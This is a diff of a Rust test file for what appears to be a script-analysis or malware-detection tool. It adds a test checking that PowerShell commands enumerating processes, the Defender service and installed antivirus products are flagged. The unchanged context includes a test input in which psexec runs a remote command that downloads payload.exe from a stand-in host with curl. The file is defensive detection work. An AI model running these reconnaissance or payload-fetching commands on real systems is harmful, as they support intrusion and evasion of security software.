@@ -4718,6 +4718,33 @@ C:\Users\Public\tz.tmp /g
     }
 
     #[test]
+    fn powershell_discovery_commands_emit_enumeration_traits() {
+        let report = analyze(
+            br#"powershell -Command "Get-Process explorer"
+powershell -Command "Get-Service WinDefend"
+powershell -Command "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct"
+"#,
+            &AnalyzeConfig::default(),
+        );
+
+        for (kind, needle) in [
+            ("ps-get-process", "Get-Process explorer"),
+            ("ps-get-service", "Get-Service WinDefend"),
+            ("ps-securitycenter", "AntiVirusProduct"),
+        ] {
+            assert!(
+                report.traits.iter().any(|t| matches!(
+                    t,
+                    Trait::Enumeration { enum_kind, command }
+                        if enum_kind == kind && command.contains(needle)
+                )),
+                "missing PowerShell discovery enumeration {kind}: {:?}",
+                report.traits
+            );
+        }
+    }
+
+    #[test]
     fn psexec_replays_remote_cmd_child() {
         let script = br#"psexec \\target.example -u admin -p pass cmd.exe /V:ON /c set U=https://psexec-wrapper.example/payload.exe&&curl -o payload.exe !U!"#;
         let report = analyze(script, &AnalyzeConfig::default());
